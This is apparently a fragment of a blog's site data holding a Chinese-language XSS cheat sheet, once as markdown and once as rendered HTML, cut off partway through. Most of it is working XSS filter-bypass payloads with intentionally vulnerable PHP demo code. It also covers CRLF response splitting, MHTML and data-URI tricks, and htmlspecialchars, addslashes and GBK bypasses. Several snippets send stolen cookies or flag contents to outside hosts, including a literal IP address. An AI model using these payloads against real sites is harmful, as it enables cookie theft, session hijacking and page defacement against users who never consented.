x\\>修正为</script>，由于该特性只是按照标签配对，没有考虑HTML注释或其他复杂情况，会导致xss.\n\n## img编码绕过\n\n```html\n<img src=\"\" onerror=\"j&#00097vascript:alert('xss');\">\n<img src=\"\" onerror=\"j&#97vascript:alert('xss1');\">\n<img src=\"\" onerror=\" javascript:alert('xss3');\">\n```\n\n## a绕过,javascript伪协议\n\n```\n\"><a href=\"javascript:alert(1)\">click me</a><\"\n```\n\n## body和div\n\n```\n\"><body onload=alert(1)><\"\n\"><div onclick=\"alert('xss')\">click me<\"\n```\n\n## 过滤括号\n\n```php\n<?php \n    ini_set(\"display_errors\", 0); \n\t$str = strtolower(@$_POST[\"keyword\"]); \n\twhile (strpos($str,'script')) {$str = str_replace('script', '', $str);} \n\t$str = str_replace('(', '', $str); \n\t$str = str_replace(')', '', $str); \n\techo ' <form class=\"main\" action=\"index.php\" method=\"POST\"> <input name=keyword size=60 value=\"'.$str.'\"> <input type=submit name=submit value=\"Search\"/> </form>'; echo '<p class=\"main\">No results for \"<b>'.htmlspecialchars($str).'</b>\"</p>'; ?>\n```\n\n```\n\"><body onload=alert`1`><\"\n\" onfocus=alert`1` \"\n```\n\n## 过滤`',\",' '   `\n\n有时候用斜杠是可以代替空格的\n\n```\n<?php \n    ini_set(\"display_errors\", 0); \n\t$str = strtolower(@$_POST[\"keyword\"]); \n\twhile (strpos($str,'script')) {$str = str_replace('script', '', $str);} \n\t$str = str_replace('(', '', $str); \n\t$str = str_replace(')', '', $str); \n\t$str = str_replace(' ', '', $str); \n\techo ' <form class=\"main\" action=\"index.php\" method=\"POST\"> <input name=keyword size=60 value=\"'.$str.'\"> <input type=submit name=submit value=\"Search\"/> </form>'; echo '<p class=\"main\">No results for \"<b>'.htmlspecialchars($str).'</b>\"</p>'; ?\n```\n\n```\n\"/onfocus=alert`1`/\"\n\"><img/src='1'/onerror=alert`0`><\"\n\"><<svg/onload=alert`1`><\"\n```\n\n## 过滤尖括号里边的所有东西\n\n```\n<?php \n    ini_set(\"display_errors\", 0); \n\t$str = strtolower(@$_POST[\"keyword\"]); \n\t$str = preg_replace(\"/<.*?>/\", '', $str);\n\techo ' <form class=\"main\" action=\"index.php\" method=\"POST\"> <input name=keyword size=60 value=\"'.$str.'\"> <input type=submit name=submit value=\"Search\"/> </form>'; echo '<p class=\"main\">No results for \"<b>'.htmlspecialchars($str).'</b>\"</p>'; ?\n```\n\n```\n\" type=image src=x onerror=alert(1) \"\n=> <input type=image src=x onerror=alert(1)>\ninput会被当做img标签使用\n\n\"/onfocus=alert`1`/\"             => 不会自动触发\n```\n\n## js中的连接符\n\n```\n <?php \n \tini_set(\"display_errors\", 0); \n \t$name = $_GET[\"name\"]; \n \techo '<h3 class=\"main\">No results for \"<b>'; echo htmlspecialchars($name).'</b>\"</h3>'; echo ' <script> var t=\"'.$name.'\"; var s=\"xxxxxxxx\"; var d=\"dddd\"; </script>'; ?> \n```\n\n```\n这里就是一个新的输出点了，你的值是输出在js代码中的 只要闭合双引号，然后就可以写你自己的js代码了 比如 \"-alert(1)-\" 赋值给url中的name即可 -是js中的连接符号\n\n\nname=\";alert(1);//\n```\n\n##  危险字符\n\n| <    | &lt          |\n| ---- | ------------ |\n| >    | ```&gt;```   |\n| &    | ```&amp;```  |\n| \"    | ```&quot;``` |\n| '    | ```&#39```   |\n\n## Dom-Based XSS\n\n> document.URL\n>\n> document.URLUencoded\n>\n> document.location(.pathname|.href|.search|.hash)\n>\n> window.location(.pathname|.href|.search|.hash)\n>\n> document.referrer\n>\n> window.name\n>\n> document.cookie\n>\n> HTML5 postMessage\n>\n> localStorage/globalStorage\n>\n> XMLHTTPRequest response\n>\n> Input.value\n\n## htmlspecialchars可绕过情况\n\n```\necho \"<input type=\\\"text\\\" value='\" + htmlspecialchars($str) + \"'>Please input the t1 as parameter\";\n```\n\n```\n$str = ' onmouseover=alert(1) > //\n```\n\n因为htmlspecialchars默认只过滤`<`，`>`, `\"`，`&`,默认为`ENT_COMPAT`\n\n```\nENT_COMPAT - 默认。仅编码双引号。\nENT_QUOTES - 编码双引号和单引号。\nENT_NOQUOTES - 不编码任何引号。\n```\n\n## addslashes\n\n```\necho \"<input type=\\\"text\\\" value='\" + addslashes($str) +\"'>Please input the t1 as parameter\";\n```\n\npaylaod1:\n\n```\n$str = ' onmouseover=alert(1) //\n=> 源码:\n<input type=\"text\" value='\\' onmouseover=alert(1) //'>Please input the t2 as parameter\n=> 浏览器处理结果:\n<input value=\"\\\" onmouseover=\"alert(1)//'\" type=\"text\">\n```\n\n在火狐里边也能触发，如果去掉 `//` 则无法触发，应该是`//` 注释掉了后边的单引号，浏览器处理出现问题\n\n如果使用以上 payload,浏览器最终结果:\n\n```\n<input value=\"\\\" onmouseover=\"alert(1)//'\" type=\"text\">\n```\n\n如果去掉`//`\n\n```\n$str = ' onmouseover=alert(1) //\n=> 源码:\n<input type=\"text\" value='\\' onmouseover=alert(1)'>Please input the t2 as parameter\n=> 浏览器处理结果：\n<input type=\"text\" value='\\' onmouseover=alert(1)'>Please input the t2 as parameter\n```\n\n这时候，就无法触发alert。\n\npaylaod2: \n\n这个payload只能在编码为gbk的情况下才能使用。\n\n```\n<meta charset=\"gbk\">\n```\n\n```\n %df'><script>alert(1)</script> //\n```\n\n## strip_tags绕过\n\n```\necho '<input type=\"text\" value=\"' + strip_tags($str) +'\">Please input the t1 as parameter';\n```\n\npayload:\n\n```\n\" onmouseover=alert(1) //\n```\n\n","slug":"xss","published":1,"updated":"2018-06-29T12:50:35.944Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjkia12ix0021qkdlh5ly0pn2","content":"<p>link 标签引入外部 js。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">也可以用域名，将 . 用 。 代替。</span><br><span class=\"line\">&lt;link rel=<span class=\"keyword\">import</span> href=\\\\八进制ip</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> xhr = <span class=\"keyword\">new</span> XMLHttpRequest();</span><br><span class=\"line\">  xhr.open(<span class=\"string\">\"GET\"</span>, <span class=\"string\">\"https://router.vip/flag.php\"</span>, <span class=\"literal\">false</span>);</span><br><span class=\"line\">  xhr.send();</span><br><span class=\"line\">  a=xhr.responseText;</span><br><span class=\"line\">  location.href=<span class=\"string\">'https://master.xbfzss.cn/?a='</span>+<span class=\"built_in\">escape</span>(a);</span><br><span class=\"line\">&lt;<span class=\"regexp\">/script&gt;</span></span><br></pre></td></tr></table></figure>\n<p>xss:<br>jquery版本&gt;=1.9<br>sourceMappingURL加载外部资源</p>\n<script>//# sourceMappingURL=https://xxx.com/?${escape(document.cookie)}</script>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;input name=keyword  value=&quot;&lt;scrilpt&gt;alert(1);&lt;/script&gt;&quot;&gt;</span><br><span class=\"line\">payload:&quot; onmouseover=alert(1) &quot;</span><br><span class=\"line\">&lt;input name=keyword  value=&quot;&quot; onmouseover=alert(1) &quot;&quot;&gt;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;input name=keyword  value=&apos;&apos;&gt;</span><br><span class=\"line\">payload:&apos; onmouseover=alert(1) &apos;</span><br><span class=\"line\">&lt;input name=keyword  value=&apos; onmouseover=alert(1) &apos;&apos;&gt;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;input name=keyword  value=&quot;&quot;&gt;</span><br><span class=\"line\">过滤了on</span><br><span class=\"line\">&lt;input name=keyword  value=&quot;&quot; o_nclick=alert(1) &quot;&quot;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">payload:&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot; &gt;as&lt;/a&gt;</span><br><span class=\"line\">&lt;input name=keyword  value=&quot;&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot; &gt;&lt;/a&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;input name=keyword  value=&quot;&quot;&gt;</span><br><span class=\"line\">过滤了on</span><br><span class=\"line\">&lt;input name=keyword  value=&quot;&quot; o_nclick=alert(1) &quot;&quot;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">payload:&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot; &gt;as&lt;/a&gt;</span><br><span class=\"line\">&lt;input name=keyword  value=&quot;&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot; &gt;&lt;/a&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p>空格可以使用%0a，%0d绕过</p>\n<p>= onmouseover=alert`1`<br>alert(1)   两边的括号可以使用<code></code>替换</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class=\"line\">var call_window;</span><br><span class=\"line\">call_window = window.open(&quot;http://localhost/call.php&quot;);</span><br><span class=\"line\">setTimeout(function()&#123;</span><br><span class=\"line\">    call_window.postMessage(&#123;</span><br><span class=\"line\">      type: &quot;audio&quot;,</span><br><span class=\"line\">      details: &#123;</span><br><span class=\"line\">      sender_username: &quot;&lt;img src=xx: onerror=window.open(&apos;http://123.207.90.143/index.php?a=&apos;+document.cookie)&gt;&quot;,</span><br><span class=\"line\">        sender_team_name: &quot;zzzz&quot;,</span><br><span class=\"line\">        receiver_username: &quot;test&quot;,</span><br><span class=\"line\">        receiver_team_name: &quot;test&quot;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;, &quot;*&quot;);</span><br><span class=\"line\">&#125;, 1000);</span><br><span class=\"line\">&lt;/script&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n<h2 id=\"CRLF-注射攻击（HTTP-ResponseSplitting）-HRS\"><a href=\"#CRLF-注射攻击（HTTP-ResponseSplitting）-HRS\" class=\"headerlink\" title=\"CRLF 注射攻击（HTTP ResponseSplitting）(HRS)\"></a>CRLF 注射攻击（HTTP ResponseSplitting）(HRS)</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nameValueCollection request = Request.QueryString;</span><br><span class=\"line\">Response.Cookies[&quot;username&quot;].Value = request[&quot;text&quot;]</span><br></pre></td></tr></table></figure>\n<p>正常访问:</p>\n<blockquote>\n<p><a href=\"http://www.test.com/demo.aspx?text=test\" target=\"_blank\" rel=\"noopener\">http://www.test.com/demo.aspx?text=test</a></p>\n</blockquote>\n<p>正常情况下，会使用text=test来setcookie</p>\n<p>payload:</p>\n<blockquote>\n<p><a href=\"http://www.test.com/demo.aspx?text=a%0D%0ASet-Cookie%03A020HackedCookie=Hacked\" target=\"_blank\" rel=\"noopener\">http://www.test.com/demo.aspx?text=a%0D%0ASet-Cookie%03A020HackedCookie=Hacked</a></p>\n</blockquote>\n<p>正常情况下：HTTP Response如下:</p>\n<blockquote>\n<p>HTTP/1.1 200 OK</p>\n<p>Set-Cookie: userName=test</p>\n<p>Content-Type: text/html; charset-utf-8</p>\n</blockquote>\n<p>使用payload的情况下:</p>\n<blockquote>\n<p>HTTP/1.1 200 OK</p>\n<p>Set-Cookie: username=a</p>\n<p>Set-Cookie: HackedCookie=Hacked</p>\n<p>Content-Type: text/html; charset-utf8</p>\n</blockquote>\n<p>更严重的情况下:</p>\n<p>payload:</p>\n<blockquote>\n<p><a href=\"http://www.test.com/page.php?page=%0d%0aContent-Type\" target=\"_blank\" rel=\"noopener\">http://www.test.com/page.php?page=%0d%0aContent-Type</a>: text/html%0D%0AHTTP/1.1 200 OK %0D%0AContent-Type: text/html%0D%0A%0D%0A%3Chtml%3EHacker Content%3C/html%3E</p>\n</blockquote>\n<p>该代码明显恶意，但是浏览器也会执行。</p>\n<h2 id=\"MHTML协议安全-IE浏览器\"><a href=\"#MHTML协议安全-IE浏览器\" class=\"headerlink\" title=\"MHTML协议安全[IE浏览器]\"></a>MHTML协议安全[IE浏览器]</h2><p>MHTML协议格式:</p>\n<blockquote>\n<p>mhtml: [Mhtml_File_Url]![Original_Resource_Url]</p>\n</blockquote>\n<p>新建一个HTML文件，demo.html</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Content-Type: multipart/related; boundary=\"_boundary_by_mere\"</span><br><span class=\"line\"></span><br><span class=\"line\">--_boundary_by_mere</span><br><span class=\"line\">Cotent-Location: demo</span><br><span class=\"line\">Content-Transfer-Encoding: base64</span><br><span class=\"line\"></span><br><span class=\"line\">PHNjcmlwdD5hbGVydCgneHNzJyk7PC9zY3JpcHQ=</span><br><span class=\"line\">--_boundary_by_mere--</span><br></pre></td></tr></table></figure>\n<p>当使用如下链接进行访问的时候，就会弹窗：</p>\n<blockquote>\n<p>mhtml:<a href=\"http://127.0.0.1/demo.html!demo\" target=\"_blank\" rel=\"noopener\">http://127.0.0.1/demo.html!demo</a></p>\n</blockquote>\n<p>注意:为了让IE调用MHTML Protocol Handler将该资源当做MHTML格式文件解析处理，需要把URL修改为MHTML协议，在”http”之前加上”mhtml:”，在url后边加上”!demo”字样。</p>\n<p>此外，还可以结合CRLF漏洞实现XSS。</p>\n<p>首先PHP脚本如下(test.php):</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">    <span class=\"keyword\">echo</span> $_GET[<span class=\"string\">'k'</span>];</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>构造url:</p>\n<blockquote>\n<p>mhtml:<a href=\"http://127.0.0.1/test.php?k=ax%250AContent-Type%3A%20multipart%2frelated%3B%20boundary%3D%22_boundary_by_mere%22%250D%250A--_boundary_by_mere%250D%250ACotent-Location%3A%20xss%250D%250AContent-Transfer-Encoding%3A%20base64%250D%250A%250D%250APHNjcmlwdD5hbGVydCgneHNzJyk7PC9zY3JpcHQ%3D%250D%250A--_boundary_by_mere--!xss\" target=\"_blank\" rel=\"noopener\">http://127.0.0.1/test.php?k=ax%250AContent-Type%3A%20multipart%2frelated%3B%20boundary%3D%22_boundary_by_mere%22%250D%250A--_boundary_by_mere%250D%250ACotent-Location%3A%20xss%250D%250AContent-Transfer-Encoding%3A%20base64%250D%250A%250D%250APHNjcmlwdD5hbGVydCgneHNzJyk7PC9zY3JpcHQ%3D%250D%250A--_boundary_by_mere--!xss</a></p>\n</blockquote>\n<h2 id=\"利用Data-URIs进行XSS\"><a href=\"#利用Data-URIs进行XSS\" class=\"headerlink\" title=\"利用Data URIs进行XSS\"></a>利用Data URIs进行XSS</h2><p>该方案和MHTML有些类似。Data URI格式如下:</p>\n<blockquote>\n<p> data:[<mime type=\"\">][;charset=<charset>][;base64],<encoded data=\"\"></encoded></charset></mime></p>\n</blockquote>\n<blockquote>\n<p>data指代URI协议</p>\n<p>mime type 代表数据类型，如PNG图片则为image/png,若无说明，默认为text/plain</p>\n<p>charset 如果不适用base64，则使用charset指定的字符类型</p>\n<p>encoded data 对应的编码信息</p>\n</blockquote>\n<p>例如:</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">\"data:image/gif;base64,R0lGODlhMwAxAIAAAAAAAP///</span></span></span><br><span class=\"line\"><span class=\"tag\"><span class=\"string\">yH5BAAAAAAALAAAAAAzADEAAAK8jI+pBr0PowytzotTtbm/DTqQ6C3hGX</span></span></span><br><span class=\"line\"><span class=\"tag\"><span class=\"string\">ElcraA9jIr66ozVpM3nseUvYP1UEHF0FUUHkNJxhLZfEJNvol06tzwrgd</span></span></span><br><span class=\"line\"><span class=\"tag\"><span class=\"string\">LbXsFZYmSMPnHLB+zNJFbq15+SOf50+6rG7lKOjwV1ibGdhHYRVYVJ9Wn</span></span></span><br><span class=\"line\"><span class=\"tag\"><span class=\"string\">k2HWtLdIWMSH9lfyODZoZTb4xdnpxQSEF9oyOWIqp6gaI9pI1Qo7BijbF</span></span></span><br><span class=\"line\"><span class=\"tag\"><span class=\"string\">ZkoaAtEeiiLeKn72xM7vMZofJy8zJys2UxsCT3kO229LH1tXAAAOw==\"</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>XSS隐患，执行XSS最常用的方法是引入<script>标签，如果过滤，就没有办法使用了。</p>\n<blockquote>\n<p>\\&lt;a href=”data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk7PC9zY3JpcHQ+”>test\\&lt;/a></p>\n</blockquote>\n<p>其中:</p>\n<blockquote>\n<p>PHNjcmlwdD5hbGVydCgneHNzJyk7PC9zY3JpcHQ+</p>\n</blockquote>\n<p>解码后:</p>\n<blockquote>\n<p>\\&lt;script>alert(‘xss’);\\&lt;/script></p>\n</blockquote>\n<p>这种方法，现在不支持，同样不支持的还有<meta>标签，  chrome和firefox都会禁止。  </p>\n<blockquote>\n <meta http-equiv=\"Refresh\" content=\"0; URL=data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk7PC9zY3JpcHQ+\">\n</blockquote>\n<p><object>则可以使用,<iframe>也行。</p>\n<blockquote>\n<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk7PC9zY3JpcHQ+\"></object>\n\n<iframe src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk7PC9zY3JpcHQ+\"></iframe>\n</blockquote>\n<h2 id=\"simple-xss\"><a href=\"#simple-xss\" class=\"headerlink\" title=\"simple xss\"></a>simple xss</h2><p>XSS payload只允许使用大小写字母数字加上<code>&lt;^*~\\-|_=+</code>这些特殊符号，那么大概只有两种方案：</p>\n<ol>\n<li>利用onload=A=B 可以作一句给A(通常是location)赋值B的简单js赋值操作</li>\n<li>利用某些奇怪的HTML标签特性</li>\n</ol>\n<p>比赛时感觉方向1行不通，于是我走了方向2的思路。但方向1还真让某<code>LC↯BC</code>队<a href=\"https://ctftime.org/writeup/5956\">https://ctftime.org/writeup/5956</a> 脑洞出来了个奇葩思路</p>\n<blockquote>\n<p>&lt;svg id=\\ onload=location=id+id+12345609861+domain+id+1234+id </p>\n</blockquote>\n<p>我们（nao）想（dong）出来的payload有如下几个关键点：</p>\n<ol>\n<li>Chrome会把域名中的<code>。</code>（全角句号）理解成<code>.</code></li>\n<li><code>&lt;link rel=import</code>这种标签会把html import到当前页面里….N年前玩polymer的时候常用的一种标签…这里不能用script标签，因为script标签没有正常闭合时引用的js貌似不会被执行</li>\n<li><code>\\\\</code>会被Chrome理解成<code>//</code>，<code>\\</code>也会理解成<code>/</code> （其实这里有个小插曲，我Win10上的Chrome会把<code>\\\\</code>理解成windows资源管理器里敲的那种<code>\\\\</code>也就是samba协议(或<code>file://</code>伪协议)…所以这种payload XSS Windows貌似是不行…?）， 因此<code>\\\\example。com\\xssHtml</code>会变成<code>//example.com/xssHtml</code></li>\n</ol>\n<p>综上，payload:</p>\n<blockquote>\n<p>&lt;link rel=import href=\\example。com\\xssHtml other= </p>\n</blockquote>\n<h2 id=\"RSS中的XSS\"><a href=\"#RSS中的XSS\" class=\"headerlink\" title=\"RSS中的XSS\"></a>RSS中的XSS</h2><p>略</p>\n<h2 id=\"浏览器差异\"><a href=\"#浏览器差异\" class=\"headerlink\" title=\"浏览器差异\"></a>浏览器差异</h2><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text/javascript\"</span>&gt;</span><span class=\"undefined\">&lt;!--</span></span><br><span class=\"line\"><span class=\"xml\">    var x = \"xssed<span class=\"tag\">&lt;/<span class=\"name\">script</span> <span class=\"attr\">x</span>\\&gt;</span><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">x</span>\\&gt;</span><span class=\"javascript\">alert(<span class=\"regexp\">/xss/</span>);<span class=\"comment\">//\";</span></span></span></span><br><span class=\"line\"><span class=\"javascript\"><span class=\"comment\">//--&gt;</span></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>Chrome会动态修正一些节点，如将</script>修正为，由于该特性只是按照标签配对，没有考虑HTML注释或其他复杂情况，会导致xss.</p>\n<h2 id=\"img编码绕过\"><a href=\"#img编码绕过\" class=\"headerlink\" title=\"img编码绕过\"></a>img编码绕过</h2><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">\"\"</span> <span class=\"attr\">onerror</span>=<span class=\"string\">\"j&amp;#00097vascript:alert('xss');\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">\"\"</span> <span class=\"attr\">onerror</span>=<span class=\"string\">\"j&amp;#97vascript:alert('xss1');\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">\"\"</span> <span class=\"attr\">onerror</span>=<span class=\"string\">\" javascript:alert('xss3');\"</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"a绕过-javascript伪协议\"><a href=\"#a绕过-javascript伪协议\" class=\"headerlink\" title=\"a绕过,javascript伪协议\"></a>a绕过,javascript伪协议</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt;click me&lt;/a&gt;&lt;&quot;</span><br></pre></td></tr></table></figure>\n<h2 id=\"body和div\"><a href=\"#body和div\" class=\"headerlink\" title=\"body和div\"></a>body和div</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;&gt;&lt;body onload=alert(1)&gt;&lt;&quot;</span><br><span class=\"line\">&quot;&gt;&lt;div onclick=&quot;alert(&apos;xss&apos;)&quot;&gt;click me&lt;&quot;</span><br></pre></td></tr></table></figure>\n<h2 id=\"过滤括号\"><a href=\"#过滤括号\" class=\"headerlink\" title=\"过滤括号\"></a>过滤括号</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\">    ini_set(<span class=\"string\">\"display_errors\"</span>, <span class=\"number\">0</span>); </span><br><span class=\"line\">\t$str = strtolower(@$_POST[<span class=\"string\">\"keyword\"</span>]); </span><br><span class=\"line\">\t<span class=\"keyword\">while</span> (strpos($str,<span class=\"string\">'script'</span>)) &#123;$str = str_replace(<span class=\"string\">'script'</span>, <span class=\"string\">''</span>, $str);&#125; </span><br><span class=\"line\">\t$str = str_replace(<span class=\"string\">'('</span>, <span class=\"string\">''</span>, $str); </span><br><span class=\"line\">\t$str = str_replace(<span class=\"string\">')'</span>, <span class=\"string\">''</span>, $str); </span><br><span class=\"line\">\t<span class=\"keyword\">echo</span> <span class=\"string\">' &lt;form class=\"main\" action=\"index.php\" method=\"POST\"&gt; &lt;input name=keyword size=60 value=\"'</span>.$str.<span class=\"string\">'\"&gt; &lt;input type=submit name=submit value=\"Search\"/&gt; &lt;/form&gt;'</span>; <span class=\"keyword\">echo</span> <span class=\"string\">'&lt;p class=\"main\"&gt;No results for \"&lt;b&gt;'</span>.htmlspecialchars($str).<span class=\"string\">'&lt;/b&gt;\"&lt;/p&gt;'</span>; <span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;&gt;&lt;body onload=alert`1`&gt;&lt;&quot;</span><br><span class=\"line\">&quot; onfocus=alert`1` &quot;</span><br></pre></td></tr></table></figure>\n<h2 id=\"过滤-39-quot-39-39\"><a href=\"#过滤-39-quot-39-39\" class=\"headerlink\" title=\"过滤&#39;,&quot;,&#39; &#39;\"></a>过滤<code>&#39;,&quot;,&#39; &#39;</code></h2><p>有时候用斜杠是可以代替空格的</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php </span><br><span class=\"line\">    ini_set(&quot;display_errors&quot;, 0); </span><br><span class=\"line\">\t$str = strtolower(@$_POST[&quot;keyword&quot;]); </span><br><span class=\"line\">\twhile (strpos($str,&apos;script&apos;)) &#123;$str = str_replace(&apos;script&apos;, &apos;&apos;, $str);&#125; </span><br><span class=\"line\">\t$str = str_replace(&apos;(&apos;, &apos;&apos;, $str); </span><br><span class=\"line\">\t$str = str_replace(&apos;)&apos;, &apos;&apos;, $str); </span><br><span class=\"line\">\t$str = str_replace(&apos; &apos;, &apos;&apos;, $str); </span><br><span class=\"line\">\techo &apos; &lt;form class=&quot;main&quot; action=&quot;index.php&quot; method=&quot;POST&quot;&gt; &lt;input name=keyword size=60 value=&quot;&apos;.$str.&apos;&quot;&gt; &lt;input type=submit name=submit value=&quot;Search&quot;/&gt; &lt;/form&gt;&apos;; echo &apos;&lt;p class=&quot;main&quot;&gt;No results for &quot;&lt;b&gt;&apos;.htmlspecialchars($str).&apos;&lt;/b&gt;&quot;&lt;/p&gt;&apos;; ?</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;/onfocus=alert`1`/&quot;</span><br><span class=\"line\">&quot;&gt;&lt;img/src=&apos;1&apos;/onerror=alert`0`&gt;&lt;&quot;</span><br><span class=\"line\">&quot;&gt;&lt;&lt;svg/onload=alert`1`&gt;&lt;&quot;</span><br></pre></td></tr></table></figure>\n<h2 id=\"过滤尖括号里边的所有东西\"><a href=\"#过滤尖括号里边的所有东西\" class=\"headerlink\" title=\"过滤尖括号里边的所有东西\"></a>过滤尖括号里边的所有东西</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php </span><br><span class=\"line\">    ini_set(&quot;display_errors&quot;, 0); 